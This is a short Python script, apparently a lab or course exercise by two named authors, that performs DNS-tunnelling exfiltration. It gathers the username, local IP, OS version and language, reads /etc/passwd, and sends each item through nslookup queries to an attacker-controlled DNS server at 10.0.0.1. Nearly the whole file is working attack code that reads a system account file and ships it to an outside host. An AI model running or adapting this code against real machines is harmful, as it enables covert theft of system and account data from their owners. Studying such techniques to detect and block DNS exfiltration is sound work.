# Raz Cohen, Aliza Lazar
import os # For system commands and environment variables
import platform # For OS version detection
import subprocess # For executing shell commands

# IP address of the attacker's DNS server
ATTACKER_DNS_IP = "10.0.0.1"

# Custom DNS zone configured on the attacker's BIND9 server
# Used to construct domain names that encode stolen data
DNS_ZONE = "x"

# Information Collection
# Gets the current logged-in username
def get_username():
    """
    Attempts to get the current logged-in username.
    First tries environment variable 'USER' (Linux),
    falls back to `whoami` command for broader OS support.
    """
    return os.getenv("USER") or subprocess.getoutput("whoami")

# Gets the system's local IP address
def get_ip():
    """
    Gets the system's local IP address.
    Uses 'hostname -I' (Linux only).
    """
    return subprocess.getoutput("hostname -I").strip().split()[0]

# Gets the OS version
def get_os_version():
    """
    Returns a human-readable string describing the OS version.
    Uses Python's cross-platform 'platform' module.
    """
    return platform.platform()

# Gets the system's default language
def get_languages():
    """
    Attempts to get the system's default language.
    Uses 'LANG' environment variable (common on Linux).
    """
    return os.getenv("LANG", "unknown")

# Exfiltration of /etc/passwd file
def exfiltrate_passwd():
    """
    Reads lines from the /etc/passwd file,
    sanitizes them to create valid DNS labels,
    and sends each line as a DNS query to the attacker's server.
    """
    try:
        # Open the /etc/passwd file and read lines
        with open("/etc/passwd", "r") as f:
            # Iterate over each line, sanitize it, and send via DNS
            for i, line in enumerate(f):
                sanitized = line.strip().replace(":", "_").replace("/", "_").replace(" ", "_")
                label = f"pw{i}-{sanitized}"[:63] # Cuts to fit DNS label length (max 63 chars)
                send_via_dns(label) # Send each sanitized line as a DNS query

    # Handle file not found or permission errors
    except Exception as e:
        send_via_dns(f"pw-error-{str(e).replace(' ', '_')[:63]}") # Send error message if file access fails

# DNS Exfiltration Mechanism
def send_via_dns(label):
    """
    Sends a chunk of data via DNS query to the attacker's server.
    - Replaces forbidden/suspicious characters
    - Builds a domain name like: sanitized.10.0.0.1.x
    - Uses nslookup to send the request (assumes nslookup is installed and in PATH)
    """
    # Clean the data to fit in a valid DNS label (max 63 chars)
    sanitized = label.replace(" ", "_").replace("/", "_").replace(":", "_")[:63]

    # Construct domain to resolve (e.g., user-root.10.0.0.1.x)
    full_domain = f"{sanitized}.{ATTACKER_DNS_IP}.{DNS_ZONE}"

    # Construct the system command to send DNS request to attacker's server
    # nslookup used to query DNS servers and find out the IP address of a domain,
    # or vice versa - check which domain belongs to an IP address
    cmd = f"nslookup {full_domain} {ATTACKER_DNS_IP}"

    # Execute the command
    os.system(cmd)

# Main Data Collection Routine
def exfiltrate():
    """
    Collects sensitive system information and sends it to the attacker using DNS tunneling technique.
    """
    print("[*] Collecting system info...")

    # Gather data into a dictionary
    data = {
        "user": get_username(), # Current user
        "ip": get_ip(), # System IP (Linux only)
        "os": get_os_version(), # OS platform string
        "lang": get_languages(), # Language settings
    }

    print("[*] Sending data via DNS...")

    # For each piece of information, send a DNS query containing it
    for key, val in data.items():
        dns_label = f"{key}-{val}" # e.g., "user-root"
        send_via_dns(dns_label) # Send as part of DNS request

    exfiltrate_passwd() # Exfiltrate /etc/passwd file content

    # Print collected data to terminal
    print("\n[*] Collected Information:")
    for key, val in data.items():
        print(f"{key}: {val}")

    print("password file: Exfiltrated via DNS queries.")

    print("\n[*] Exfiltration complete.")


if __name__ == "__main__":
    exfiltrate()
